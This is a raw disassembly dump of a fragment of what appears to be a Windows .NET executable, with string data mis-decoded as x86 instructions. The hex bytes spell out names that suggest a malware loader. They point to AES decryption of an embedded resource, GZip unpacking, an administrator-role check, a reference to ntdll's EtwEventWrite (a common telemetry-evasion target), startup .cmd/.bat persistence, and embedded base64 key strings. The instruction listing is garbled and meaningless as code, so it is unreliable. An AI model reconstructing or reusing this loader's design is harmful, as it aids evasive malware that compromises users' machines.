  406ff9:	69 72 6f 6e 6d 65 6e 	imul   $0x6e656d6e,0x6f(%edx),%esi
  407000:	74 00                	je     0x407002
  407002:	53                   	push   %ebx
  407003:	70 65                	jo     0x40706a
  407005:	63 69 61             	arpl   %ebp,0x61(%ecx)
  407008:	6c                   	insb   (%dx),%es:(%edi)
  407009:	46                   	inc    %esi
  40700a:	6f                   	outsl  %ds:(%esi),(%dx)
  40700b:	6c                   	insb   (%dx),%es:(%edi)
  40700c:	64 65 72 00          	fs gs jb 0x407010
  407010:	47                   	inc    %edi
  407011:	65 74 46             	gs je  0x40705a
  407014:	6f                   	outsl  %ds:(%esi),(%dx)
  407015:	6c                   	insb   (%dx),%es:(%edi)
  407016:	64 65 72 50          	fs gs jb 0x40706a
  40701a:	61                   	popa
  40701b:	74 68                	je     0x407085
  40701d:	00 43 6f             	add    %al,0x6f(%ebx)
  407020:	6e                   	outsb  %ds:(%esi),(%dx)
  407021:	74 61                	je     0x407084
  407023:	69 6e 73 00 44 69 72 	imul   $0x72694400,0x73(%esi),%ebp
  40702a:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40702f:	79 00                	jns    0x407031
  407031:	45                   	inc    %ebp
  407032:	78 69                	js     0x40709d
  407034:	73 74                	jae    0x4070aa
  407036:	73 00                	jae    0x407038
  407038:	44                   	inc    %esp
  407039:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407040:	79 49                	jns    0x40708b
  407042:	6e                   	outsb  %ds:(%esi),(%dx)
  407043:	66 6f                	outsw  %ds:(%esi),(%dx)
  407045:	00 43 72             	add    %al,0x72(%ebx)
  407048:	65 61                	gs popa
  40704a:	74 65                	je     0x4070b1
  40704c:	44                   	inc    %esp
  40704d:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407054:	79 00                	jns    0x407056
  407056:	47                   	inc    %edi
  407057:	75 69                	jne    0x4070c2
  407059:	64 00 4e 65          	add    %cl,%fs:0x65(%esi)
  40705d:	77 47                	ja     0x4070a6
  40705f:	75 69                	jne    0x4070ca
  407061:	64 00 53 75          	add    %dl,%fs:0x75(%ebx)
  407065:	62 73 74             	bound  %esi,0x74(%ebx)
  407068:	72 69                	jb     0x4070d3
  40706a:	6e                   	outsb  %ds:(%esi),(%dx)
  40706b:	67 00 46 6f          	add    %al,0x6f(%bp)
  40706f:	72 6d                	jb     0x4070de
  407071:	61                   	popa
  407072:	74 00                	je     0x407074
  407074:	50                   	push   %eax
  407075:	61                   	popa
  407076:	74 68                	je     0x4070e0
  407078:	00 43 6f             	add    %al,0x6f(%ebx)
  40707b:	6d                   	insl   (%dx),%es:(%edi)
  40707c:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40707f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407083:	74 46                	je     0x4070cb
  407085:	75 6c                	jne    0x4070f3
  407087:	6c                   	insb   (%dx),%es:(%edi)
  407088:	50                   	push   %eax
  407089:	61                   	popa
  40708a:	74 68                	je     0x4070f4
  40708c:	00 53 74             	add    %dl,0x74(%ebx)
  40708f:	72 69                	jb     0x4070fa
  407091:	6e                   	outsb  %ds:(%esi),(%dx)
  407092:	67 43                	addr16 inc %ebx
  407094:	6f                   	outsl  %ds:(%esi),(%dx)
  407095:	6d                   	insl   (%dx),%es:(%edi)
  407096:	70 61                	jo     0x4070f9
  407098:	72 69                	jb     0x407103
  40709a:	73 6f                	jae    0x40710b
  40709c:	6e                   	outsb  %ds:(%esi),(%dx)
  40709d:	00 45 71             	add    %al,0x71(%ebp)
  4070a0:	75 61                	jne    0x407103
  4070a2:	6c                   	insb   (%dx),%es:(%edi)
  4070a3:	73 00                	jae    0x4070a5
  4070a5:	43                   	inc    %ebx
  4070a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4070a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4070a8:	73 6f                	jae    0x407119
  4070aa:	6c                   	insb   (%dx),%es:(%edi)
  4070ab:	65 43                	gs inc %ebx
  4070ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4070ae:	6c                   	insb   (%dx),%es:(%edi)
  4070af:	6f                   	outsl  %ds:(%esi),(%dx)
  4070b0:	72 00                	jb     0x4070b2
  4070b2:	73 65                	jae    0x407119
  4070b4:	74 5f                	je     0x407115
  4070b6:	46                   	inc    %esi
  4070b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4070b8:	72 65                	jb     0x40711f
  4070ba:	67 72 6f             	addr16 jb 0x40712c
  4070bd:	75 6e                	jne    0x40712d
  4070bf:	64 43                	fs inc %ebx
  4070c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4070c2:	6c                   	insb   (%dx),%es:(%edi)
  4070c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4070c4:	72 00                	jb     0x4070c6
  4070c6:	57                   	push   %edi
  4070c7:	72 69                	jb     0x407132
  4070c9:	74 65                	je     0x407130
  4070cb:	4c                   	dec    %esp
  4070cc:	69 6e 65 00 52 65 73 	imul   $0x73655200,0x65(%esi),%ebp
  4070d3:	65 74 43             	gs je  0x407119
  4070d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4070d7:	6c                   	insb   (%dx),%es:(%edi)
  4070d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4070d9:	72 00                	jb     0x4070db
  4070db:	67 65 74 5f          	addr16 gs je 0x40713e
  4070df:	4d                   	dec    %ebp
  4070e0:	65 73 73             	gs jae 0x407156
  4070e3:	61                   	popa
  4070e4:	67 65 00 53 79       	add    %dl,%gs:0x79(%bp,%di)
  4070e9:	73 74                	jae    0x40715f
  4070eb:	65 6d                	gs insl (%dx),%es:(%edi)
  4070ed:	2e 53                	cs push %ebx
  4070ef:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4070f3:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4070fa:	6e 
  4070fb:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4070fe:	61                   	popa
  4070ff:	6c                   	insb   (%dx),%es:(%edi)
  407100:	00 57 69             	add    %dl,0x69(%edi)
  407103:	6e                   	outsb  %ds:(%esi),(%dx)
  407104:	64 6f                	outsl  %fs:(%esi),(%dx)
  407106:	77 73                	ja     0x40717b
  407108:	49                   	dec    %ecx
  407109:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40710c:	74 69                	je     0x407177
  40710e:	74 79                	je     0x407189
  407110:	00 47 65             	add    %al,0x65(%edi)
  407113:	74 43                	je     0x407158
  407115:	75 72                	jne    0x407189
  407117:	72 65                	jb     0x40717e
  407119:	6e                   	outsb  %ds:(%esi),(%dx)
  40711a:	74 00                	je     0x40711c
  40711c:	57                   	push   %edi
  40711d:	69 6e 64 6f 77 73 50 	imul   $0x5073776f,0x64(%esi),%ebp
  407124:	72 69                	jb     0x40718f
  407126:	6e                   	outsb  %ds:(%esi),(%dx)
  407127:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40712a:	61                   	popa
  40712b:	6c                   	insb   (%dx),%es:(%edi)
  40712c:	00 57 69             	add    %dl,0x69(%edi)
  40712f:	6e                   	outsb  %ds:(%esi),(%dx)
  407130:	64 6f                	outsl  %fs:(%esi),(%dx)
  407132:	77 73                	ja     0x4071a7
  407134:	42                   	inc    %edx
  407135:	75 69                	jne    0x4071a0
  407137:	6c                   	insb   (%dx),%es:(%edi)
  407138:	74 49                	je     0x407183
  40713a:	6e                   	outsb  %ds:(%esi),(%dx)
  40713b:	52                   	push   %edx
  40713c:	6f                   	outsl  %ds:(%esi),(%dx)
  40713d:	6c                   	insb   (%dx),%es:(%edi)
  40713e:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407142:	49                   	dec    %ecx
  407143:	6e                   	outsb  %ds:(%esi),(%dx)
  407144:	52                   	push   %edx
  407145:	6f                   	outsl  %ds:(%esi),(%dx)
  407146:	6c                   	insb   (%dx),%es:(%edi)
  407147:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40714b:	70 6c                	jo     0x4071b9
  40714d:	61                   	popa
  40714e:	63 65 00             	arpl   %esp,0x0(%ebp)
  407151:	53                   	push   %ebx
  407152:	79 73                	jns    0x4071c7
  407154:	74 65                	je     0x4071bb
  407156:	6d                   	insl   (%dx),%es:(%edi)
  407157:	2e 4d                	cs dec %ebp
  407159:	61                   	popa
  40715a:	6e                   	outsb  %ds:(%esi),(%dx)
  40715b:	61                   	popa
  40715c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40715f:	65 6e                	outsb  %gs:(%esi),(%dx)
  407161:	74 00                	je     0x407163
  407163:	4d                   	dec    %ebp
  407164:	61                   	popa
  407165:	6e                   	outsb  %ds:(%esi),(%dx)
  407166:	61                   	popa
  407167:	67 65 6d             	gs insl (%dx),%es:(%di)
  40716a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40716c:	74 4f                	je     0x4071bd
  40716e:	62 6a 65             	bound  %ebp,0x65(%edx)
  407171:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  407175:	61                   	popa
  407176:	72 63                	jb     0x4071db
  407178:	68 65 72 00 4d       	push   $0x4d007265
  40717d:	61                   	popa
  40717e:	6e                   	outsb  %ds:(%esi),(%dx)
  40717f:	61                   	popa
  407180:	67 65 6d             	gs insl (%dx),%es:(%di)
  407183:	65 6e                	outsb  %gs:(%esi),(%dx)
  407185:	74 4f                	je     0x4071d6
  407187:	62 6a 65             	bound  %ebp,0x65(%edx)
  40718a:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  40718e:	6c                   	insb   (%dx),%es:(%edi)
  40718f:	6c                   	insb   (%dx),%es:(%edi)
  407190:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407195:	6e                   	outsb  %ds:(%esi),(%dx)
  407196:	00 47 65             	add    %al,0x65(%edi)
  407199:	74 00                	je     0x40719b
  40719b:	4d                   	dec    %ebp
  40719c:	61                   	popa
  40719d:	6e                   	outsb  %ds:(%esi),(%dx)
  40719e:	61                   	popa
  40719f:	67 65 6d             	gs insl (%dx),%es:(%di)
  4071a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4071a4:	74 4f                	je     0x4071f5
  4071a6:	62 6a 65             	bound  %ebp,0x65(%edx)
  4071a9:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4071ad:	75 6d                	jne    0x40721c
  4071af:	65 72 61             	gs jb  0x407213
  4071b2:	74 6f                	je     0x407223
  4071b4:	72 00                	jb     0x4071b6
  4071b6:	47                   	inc    %edi
  4071b7:	65 74 45             	gs je  0x4071ff
  4071ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4071bb:	75 6d                	jne    0x40722a
  4071bd:	65 72 61             	gs jb  0x407221
  4071c0:	74 6f                	je     0x407231
  4071c2:	72 00                	jb     0x4071c4
  4071c4:	4d                   	dec    %ebp
  4071c5:	61                   	popa
  4071c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4071c7:	61                   	popa
  4071c8:	67 65 6d             	gs insl (%dx),%es:(%di)
  4071cb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4071cd:	74 42                	je     0x407211
  4071cf:	61                   	popa
  4071d0:	73 65                	jae    0x407237
  4071d2:	4f                   	dec    %edi
  4071d3:	62 6a 65             	bound  %ebp,0x65(%edx)
  4071d6:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  4071da:	65 74 5f             	gs je  0x40723c
  4071dd:	43                   	inc    %ebx
  4071de:	75 72                	jne    0x407252
  4071e0:	72 65                	jb     0x407247
  4071e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4071e3:	74 00                	je     0x4071e5
  4071e5:	4d                   	dec    %ebp
  4071e6:	61                   	popa
  4071e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4071e8:	61                   	popa
  4071e9:	67 65 6d             	gs insl (%dx),%es:(%di)
  4071ec:	65 6e                	outsb  %gs:(%esi),(%dx)
  4071ee:	74 4f                	je     0x40723f
  4071f0:	62 6a 65             	bound  %ebp,0x65(%edx)
  4071f3:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  4071f7:	65 74 5f             	gs je  0x407259
  4071fa:	49                   	dec    %ecx
  4071fb:	74 65                	je     0x407262
  4071fd:	6d                   	insl   (%dx),%es:(%edi)
  4071fe:	00 55 49             	add    %dl,0x49(%ebp)
  407201:	6e                   	outsb  %ds:(%esi),(%dx)
  407202:	74 33                	je     0x407237
  407204:	32 00                	xor    (%eax),%al
  407206:	47                   	inc    %edi
  407207:	65 74 50             	gs je  0x40725a
  40720a:	72 6f                	jb     0x40727b
  40720c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40720f:	73 42                	jae    0x407253
  407211:	79 49                	jns    0x40725c
  407213:	64 00 4d 6f          	add    %cl,%fs:0x6f(%ebp)
  407217:	76 65                	jbe    0x40727e
  407219:	4e                   	dec    %esi
  40721a:	65 78 74             	gs js  0x407291
  40721d:	00 49 44             	add    %cl,0x44(%ecx)
  407220:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407227:	6c                   	insb   (%dx),%es:(%edi)
  407228:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  40722d:	70 6f                	jo     0x40729e
  40722f:	73 65                	jae    0x407296
  407231:	00 53 79             	add    %dl,0x79(%ebx)
  407234:	73 74                	jae    0x4072aa
  407236:	65 6d                	gs insl (%dx),%es:(%edi)
  407238:	2e 43                	cs inc %ebx
  40723a:	6f                   	outsl  %ds:(%esi),(%dx)
  40723b:	72 65                	jb     0x4072a2
  40723d:	00 53 79             	add    %dl,0x79(%ebx)
  407240:	73 74                	jae    0x4072b6
  407242:	65 6d                	gs insl (%dx),%es:(%edi)
  407244:	2e 53                	cs push %ebx
  407246:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40724a:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  407251:	70 
  407252:	74 6f                	je     0x4072c3
  407254:	67 72 61             	addr16 jb 0x4072b8
  407257:	70 68                	jo     0x4072c1
  407259:	79 00                	jns    0x40725b
  40725b:	41                   	inc    %ecx
  40725c:	65 73 4d             	gs jae 0x4072ac
  40725f:	61                   	popa
  407260:	6e                   	outsb  %ds:(%esi),(%dx)
  407261:	61                   	popa
  407262:	67 65 64 00 53 79    	gs add %dl,%fs:0x79(%bp,%di)
  407268:	6d                   	insl   (%dx),%es:(%edi)
  407269:	6d                   	insl   (%dx),%es:(%edi)
  40726a:	65 74 72             	gs je  0x4072df
  40726d:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  407274:	69 74 68 6d 00 43 69 	imul   $0x70694300,0x6d(%eax,%ebp,2),%esi
  40727b:	70 
  40727c:	68 65 72 4d 6f       	push   $0x6f4d7265
  407281:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  407286:	74 5f                	je     0x4072e7
  407288:	4d                   	dec    %ebp
  407289:	6f                   	outsl  %ds:(%esi),(%dx)
  40728a:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  40728f:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407296:	64 65 
  407298:	00 73 65             	add    %dh,0x65(%ebx)
  40729b:	74 5f                	je     0x4072fc
  40729d:	50                   	push   %eax
  40729e:	61                   	popa
  40729f:	64 64 69 6e 67 00 49 	fs imul $0x72434900,%fs:0x67(%esi),%ebp
  4072a6:	43 72 
  4072a8:	79 70                	jns    0x40731a
  4072aa:	74 6f                	je     0x40731b
  4072ac:	54                   	push   %esp
  4072ad:	72 61                	jb     0x407310
  4072af:	6e                   	outsb  %ds:(%esi),(%dx)
  4072b0:	73 66                	jae    0x407318
  4072b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4072b3:	72 6d                	jb     0x407322
  4072b5:	00 43 72             	add    %al,0x72(%ebx)
  4072b8:	65 61                	gs popa
  4072ba:	74 65                	je     0x407321
  4072bc:	44                   	inc    %esp
  4072bd:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4072c1:	70 74                	jo     0x407337
  4072c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4072c4:	72 00                	jb     0x4072c6
  4072c6:	54                   	push   %esp
  4072c7:	72 61                	jb     0x40732a
  4072c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4072ca:	73 66                	jae    0x407332
  4072cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4072cd:	72 6d                	jb     0x40733c
  4072cf:	46                   	inc    %esi
  4072d0:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  4072d7:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4072da:	4d                   	dec    %ebp
  4072db:	65 6d                	gs insl (%dx),%es:(%edi)
  4072dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4072de:	72 79                	jb     0x407359
  4072e0:	53                   	push   %ebx
  4072e1:	74 72                	je     0x407355
  4072e3:	65 61                	gs popa
  4072e5:	6d                   	insl   (%dx),%es:(%edi)
  4072e6:	00 53 79             	add    %dl,0x79(%ebx)
  4072e9:	73 74                	jae    0x40735f
  4072eb:	65 6d                	gs insl (%dx),%es:(%edi)
  4072ed:	2e 49                	cs dec %ecx
  4072ef:	4f                   	dec    %edi
  4072f0:	2e 43                	cs inc %ebx
  4072f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4072f3:	6d                   	insl   (%dx),%es:(%edi)
  4072f4:	70 72                	jo     0x407368
  4072f6:	65 73 73             	gs jae 0x40736c
  4072f9:	69 6f 6e 00 47 5a 69 	imul   $0x695a4700,0x6e(%edi),%ebp
  407300:	70 53                	jo     0x407355
  407302:	74 72                	je     0x407376
  407304:	65 61                	gs popa
  407306:	6d                   	insl   (%dx),%es:(%edi)
  407307:	00 53 74             	add    %dl,0x74(%ebx)
  40730a:	72 65                	jb     0x407371
  40730c:	61                   	popa
  40730d:	6d                   	insl   (%dx),%es:(%edi)
  40730e:	00 43 6f             	add    %al,0x6f(%ebx)
  407311:	6d                   	insl   (%dx),%es:(%edi)
  407312:	70 72                	jo     0x407386
  407314:	65 73 73             	gs jae 0x40738a
  407317:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  40731e:	00 43 6f             	add    %al,0x6f(%ebx)
  407321:	70 79                	jo     0x40739c
  407323:	54                   	push   %esp
  407324:	6f                   	outsl  %ds:(%esi),(%dx)
  407325:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  407329:	72 72                	jb     0x40739d
  40732b:	61                   	popa
  40732c:	79 00                	jns    0x40732e
  40732e:	47                   	inc    %edi
  40732f:	65 74 4d             	gs je  0x40737f
  407332:	61                   	popa
  407333:	6e                   	outsb  %ds:(%esi),(%dx)
  407334:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  40733b:	73 6f                	jae    0x4073ac
  40733d:	75 72                	jne    0x4073b1
  40733f:	63 65 53             	arpl   %esp,0x53(%ebp)
  407342:	74 72                	je     0x4073b6
  407344:	65 61                	gs popa
  407346:	6d                   	insl   (%dx),%es:(%edi)
  407347:	00 2e                	add    %ch,(%esi)
  407349:	63 63 74             	arpl   %esp,0x74(%ebx)
  40734c:	6f                   	outsl  %ds:(%esi),(%dx)
  40734d:	72 00                	jb     0x40734f
  40734f:	43                   	inc    %ebx
  407350:	6f                   	outsl  %ds:(%esi),(%dx)
  407351:	6d                   	insl   (%dx),%es:(%edi)
  407352:	70 69                	jo     0x4073bd
  407354:	6c                   	insb   (%dx),%es:(%edi)
  407355:	65 72 47             	gs jb  0x40739f
  407358:	65 6e                	outsb  %gs:(%esi),(%dx)
  40735a:	65 72 61             	gs jb  0x4073be
  40735d:	74 65                	je     0x4073c4
  40735f:	64 41                	fs inc %ecx
  407361:	74 74                	je     0x4073d7
  407363:	72 69                	jb     0x4073ce
  407365:	62 75 74             	bound  %esi,0x74(%ebp)
  407368:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  40736c:	73 74                	jae    0x4073e2
  40736e:	65 6d                	gs insl (%dx),%es:(%edi)
  407370:	2e 53                	cs push %ebx
  407372:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407376:	69 74 79 00 55 6e 76 	imul   $0x65766e55,0x0(%ecx,%edi,2),%esi
  40737d:	65 
  40737e:	72 69                	jb     0x4073e9
  407380:	66 69 61 62 6c 65    	imul   $0x656c,0x62(%ecx),%sp
  407386:	43                   	inc    %ebx
  407387:	6f                   	outsl  %ds:(%esi),(%dx)
  407388:	64 65 41             	fs gs inc %ecx
  40738b:	74 74                	je     0x407401
  40738d:	72 69                	jb     0x4073f8
  40738f:	62 75 74             	bound  %esi,0x74(%ebp)
  407392:	65 00 78 78          	add    %bh,%gs:0x78(%eax)
  407396:	78 78                	js     0x407410
  407398:	78 78                	js     0x407412
  40739a:	78 78                	js     0x407414
  40739c:	78 78                	js     0x407416
  40739e:	78 78                	js     0x407418
  4073a0:	78 78                	js     0x40741a
  4073a2:	78 78                	js     0x40741c
  4073a4:	78 78                	js     0x40741e
  4073a6:	78 78                	js     0x407420
  4073a8:	78 78                	js     0x407422
  4073aa:	78 78                	js     0x407424
  4073ac:	78 78                	js     0x407426
  4073ae:	78 78                	js     0x407428
  4073b0:	2e 65 78 65          	cs js,pn 0x407419
  4073b4:	00 00                	add    %al,(%eax)
  4073b6:	00 00                	add    %al,(%eax)
  4073b8:	00 23                	add    %ah,(%ebx)
  4073ba:	45                   	inc    %ebp
  4073bb:	00 72 00             	add    %dh,0x0(%edx)
  4073be:	72 00                	jb     0x4073c0
  4073c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4073c1:	00 20                	add    %ah,(%eax)
  4073c3:	00 6e 00             	add    %ch,0x0(%esi)
  4073c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4073c7:	00 20                	add    %ah,(%eax)
  4073c9:	00 53 00             	add    %dl,0x0(%ebx)
  4073cc:	74 00                	je     0x4073ce
  4073ce:	61                   	popa
  4073cf:	00 72 00             	add    %dh,0x0(%edx)
  4073d2:	74 00                	je     0x4073d4
  4073d4:	75 00                	jne    0x4073d6
  4073d6:	70 00                	jo     0x4073d8
  4073d8:	3a 00                	cmp    (%eax),%al
  4073da:	20 00                	and    %al,(%eax)
  4073dc:	00 13                	add    %dl,(%ebx)
  4073de:	6e                   	outsb  %ds:(%esi),(%dx)
  4073df:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  4073e3:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4073e7:	00 2e                	add    %ch,(%esi)
  4073e9:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  4073ed:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  4073f1:	1b 45 00             	sbb    0x0(%ebp),%eax
  4073f4:	74 00                	je     0x4073f6
  4073f6:	77 00                	ja     0x4073f8
  4073f8:	45                   	inc    %ebp
  4073f9:	00 76 00             	add    %dh,0x0(%esi)
  4073fc:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407400:	74 00                	je     0x407402
  407402:	57                   	push   %edi
  407403:	00 72 00             	add    %dh,0x0(%edx)
  407406:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  40740c:	00 41 78             	add    %al,0x78(%ecx)
  40740f:	00 78 00             	add    %bh,0x0(%eax)
  407412:	78 00                	js     0x407414
  407414:	78 00                	js     0x407416
  407416:	78 00                	js     0x407418
  407418:	78 00                	js     0x40741a
  40741a:	78 00                	js     0x40741c
  40741c:	78 00                	js     0x40741e
  40741e:	78 00                	js     0x407420
  407420:	78 00                	js     0x407422
  407422:	78 00                	js     0x407424
  407424:	78 00                	js     0x407426
  407426:	78 00                	js     0x407428
  407428:	78 00                	js     0x40742a
  40742a:	78 00                	js     0x40742c
  40742c:	78 00                	js     0x40742e
  40742e:	78 00                	js     0x407430
  407430:	78 00                	js     0x407432
  407432:	78 00                	js     0x407434
  407434:	78 00                	js     0x407436
  407436:	78 00                	js     0x407438
  407438:	78 00                	js     0x40743a
  40743a:	78 00                	js     0x40743c
  40743c:	78 00                	js     0x40743e
  40743e:	78 00                	js     0x407440
  407440:	78 00                	js     0x407442
  407442:	78 00                	js     0x407444
  407444:	78 00                	js     0x407446
  407446:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40744a:	78 00                	js     0x40744c
  40744c:	65 00 00             	add    %al,%gs:(%eax)
  40744f:	09 2e                	or     %ebp,(%esi)
  407451:	00 65 00             	add    %ah,0x0(%ebp)
  407454:	78 00                	js     0x407456
  407456:	65 00 00             	add    %al,%gs:(%eax)
  407459:	09 2e                	or     %ebp,(%esi)
  40745b:	00 62 00             	add    %ah,0x0(%edx)
  40745e:	61                   	popa
  40745f:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  407463:	59                   	pop    %ecx
  407464:	38 00                	cmp    %al,(%eax)
  407466:	42                   	inc    %edx
  407467:	00 66 00             	add    %ah,0x0(%esi)
  40746a:	37                   	aaa
  40746b:	00 49 00             	add    %cl,0x0(%ecx)
  40746e:	75 00                	jne    0x407470
  407470:	6d                   	insl   (%dx),%es:(%edi)
  407471:	00 51 00             	add    %dl,0x0(%ecx)
  407474:	6b 00 45             	imul   $0x45,(%eax),%eax
  407477:	00 71 00             	add    %dh,0x0(%ecx)
  40747a:	55                   	push   %ebp
  40747b:	00 38                	add    %bh,(%eax)
  40747d:	00 35 00 34 00 4b    	add    %dh,0x4b003400
  407483:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  407487:	00 77 00             	add    %dh,0x0(%edi)
  40748a:	39 00                	cmp    %eax,(%eax)
  40748c:	49                   	dec    %ecx
  40748d:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  407491:	00 7a 00             	add    %bh,0x0(%edx)
  407494:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  407498:	58                   	pop    %eax
  407499:	00 46 00             	add    %al,0x0(%esi)
  40749c:	53                   	push   %ebx
  40749d:	00 34 00             	add    %dh,(%eax,%eax,1)
  4074a0:	41                   	inc    %ecx
  4074a1:	00 6e 00             	add    %ch,0x0(%esi)
  4074a4:	71 00                	jno    0x4074a6
  4074a6:	74 00                	je     0x4074a8
  4074a8:	39 00                	cmp    %eax,(%eax)
  4074aa:	73 00                	jae    0x4074ac
  4074ac:	4a                   	dec    %edx
  4074ad:	00 46 00             	add    %al,0x0(%esi)
  4074b0:	75 00                	jne    0x4074b2
  4074b2:	41                   	inc    %ecx
  4074b3:	00 45 00             	add    %al,0x0(%ebp)
  4074b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4074b7:	00 4d 00             	add    %cl,0x0(%ebp)
  4074ba:	3d 00 00 31 79       	cmp    $0x79310000,%eax
  4074bf:	00 70 00             	add    %dh,0x0(%eax)
  4074c2:	77 00                	ja     0x4074c4
  4074c4:	66 00 37             	data16 add %dh,(%edi)
  4074c7:	00 75 00             	add    %dh,0x0(%ebp)
  4074ca:	30 00                	xor    %al,(%eax)
  4074cc:	56                   	push   %esi
  4074cd:	00 47 00             	add    %al,0x0(%edi)
  4074d0:	41                   	inc    %ecx
  4074d1:	00 79 00             	add    %bh,0x0(%ecx)
  4074d4:	72 00                	jb     0x4074d6
  4074d6:	74 00                	je     0x4074d8
  4074d8:	4f                   	dec    %edi
  4074d9:	00 70 00             	add    %dh,0x0(%eax)
  4074dc:	7a 00                	jp     0x4074de
  4074de:	75 00                	jne    0x4074e0
  4074e0:	48                   	dec    %eax
  4074e1:	00 65 00             	add    %ah,0x0(%ebp)
  4074e4:	42                   	inc    %edx
  4074e5:	00 73 00             	add    %dh,0x0(%ebx)
  4074e8:	41                   	inc    %ecx
  4074e9:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  4074ef:	2b 53 00             	sub    0x0(%ebx),%edx
  4074f2:	74 00                	je     0x4074f4
  4074f4:	61                   	popa
  4074f5:	00 72 00             	add    %dh,0x0(%edx)
  4074f8:	74 00                	je     0x4074fa
  4074fa:	75 00                	jne    0x4074fc
  4074fc:	70 00                	jo     0x4074fe
  4074fe:	53                   	push   %ebx
  4074ff:	00 63 00             	add    %ah,0x0(%ebx)
  407502:	72 00                	jb     0x407504
  407504:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40750a:	5f                   	pop    %edi
  40750b:	00 7b 00             	add    %bh,0x0(%ebx)
  40750e:	30 00                	xor    %al,(%eax)
  407510:	7d 00                	jge    0x407512
  407512:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407516:	6d                   	insl   (%dx),%es:(%edi)
  407517:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40751b:	3b 0a                	cmp    (%edx),%ecx
  40751d:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  407523:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  407529:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40752f:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  407535:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40753b:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  407541:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  407547:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  40754d:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  407553:	00 3d 00 00 51 20    	add    %bh,0x20510000
  407559:	00 20                	add    %ah,(%eax)
  40755b:	00 53 00             	add    %dl,0x0(%ebx)
